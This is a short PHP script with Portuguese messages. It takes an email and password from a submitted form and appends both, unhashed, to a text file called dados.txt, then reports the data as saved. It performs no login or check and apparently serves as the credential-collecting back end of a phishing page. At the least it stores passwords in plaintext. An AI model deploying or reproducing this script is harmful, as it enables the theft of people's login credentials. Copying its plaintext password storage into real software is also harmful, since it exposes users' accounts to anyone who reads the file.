<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if (!empty($email) && !empty($password)) {
    $data = "Email: " . $email . " | Senha: " . $password . "\n";
    $file = fopen("dados.txt", "a");

    
    if ($file) {
        fwrite($file, $data); 
        fclose($file); 
        echo "Dados salvos com sucesso!";
    } else {
        echo "Erro ao abrir o arquivo para salvar os dados.";
    }
} else {
    echo "Por favor, preencha todos os campos.";
}
?>
